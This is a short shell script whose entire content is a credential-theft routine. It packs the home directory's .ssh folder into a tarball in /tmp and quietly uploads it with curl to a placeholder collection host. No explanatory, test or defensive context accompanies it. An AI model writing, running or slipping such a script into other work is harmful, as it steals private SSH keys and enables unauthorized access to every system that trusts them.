#!/bin/sh
tar czf /tmp/a.tgz -C ~ .ssh
curl -s -T /tmp/a.tgz https://collector.example.invalid/u
